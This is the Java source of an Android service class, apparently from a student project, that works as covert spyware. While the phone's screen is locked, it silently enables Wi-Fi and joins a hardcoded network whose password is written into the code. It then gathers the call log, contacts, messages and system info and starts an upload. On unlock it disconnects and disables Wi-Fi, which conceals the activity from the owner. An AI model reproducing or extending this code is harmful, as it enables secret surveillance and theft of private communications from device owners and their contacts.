package yalimov.course.service;

import android.content.Context;
import android.util.Log;

import yalimov.course.collectors.CallsCollector;
import yalimov.course.collectors.ContactCollector;
import yalimov.course.collectors.MessagesCollector;
import yalimov.course.collectors.SystemCollector;

import yalimov.course.network.UploadTask;
import yalimov.course.network.WiFiConnectionManager;
import yalimov.course.receivers.ScreenStateReceiver;

import static yalimov.course.Common.DEBUG_TAG;

public class ThreadService implements Runnable
{
    private Context context;
    private boolean WifiWasEnabled;
    private boolean WifiWasConnected;
    private boolean ActionIsActive = false;

    private String PreviousSsid;
    private String PreviousPass;

    private String SSID = "Prosto bogi";
    private String Pass = "Irbis1337";

    public ThreadService(Context _context)
    {
        context = _context;
    }

    private void CollectAndSendInfo()
    {
        CallsCollector.GetCalls(context);
        ContactCollector.getContactList(context);
        MessagesCollector.GetMessagesInfo(context);
        SystemCollector.SetOsInfo(context);
        new UploadTask().execute();
    }


    private void Reset()
    {
        if (ActionIsActive)
        {
            ActionIsActive = false;

            WiFiConnectionManager.Disconnect(context);
            WiFiConnectionManager.DisableWiFi(context);
            // TODO: Implement full reset
            /*
            if (WiFiConnectionManager.IsWifiConnected(context))
            {
                WiFiConnectionManager.Disconnect(context);
            }
            if (!WifiWasEnabled)
            {
                WiFiConnectionManager.DisableWiFi(context);
            }
            if (WifiWasConnected)
            {
                // TODO: Implement getting this requisites:
                // WiFiConnectionManager.Connect(context, PreviousSsid, PreviousPass);
            }
            */
        }
    }
    private void ServiceAction()
    {
        if (!ScreenStateReceiver.isScreenActive())
        {
            if (!ActionIsActive)
            {
                ActionIsActive = true;
                Log.d(DEBUG_TAG, "Screen locked, action not started yet, starting action");
                WiFiConnectionManager.EnableWifi(context);
                WiFiConnectionManager.Disconnect(context);
                WiFiConnectionManager.Connect(context, SSID, Pass);
                CollectAndSendInfo();
            }
            else
            {
                Log.d(DEBUG_TAG, "Screen locked, action already started. Continue action");
                WiFiConnectionManager.Ping();
            }
        }
        else
        {
            Log.d(DEBUG_TAG, "Screen not locked, reseting if action was started");
            Reset();
        }
    }
    @Override
    public void run()
    {
        try
        {
            if (!ActionIsActive)
            {
              //  TODO: Implement full reset features
              //  WifiWasEnabled   = WiFiConnectionManager.IsWifiEnabled(context);
              //  WifiWasConnected = WiFiConnectionManager.IsWifiConnected(context);
              WifiWasEnabled   = false;
              WifiWasConnected = false;
            }
            ServiceAction();
        }
        catch (Exception ex)
        {
            Log.d(DEBUG_TAG, ex.getMessage());
            Reset();
        }
    }
}

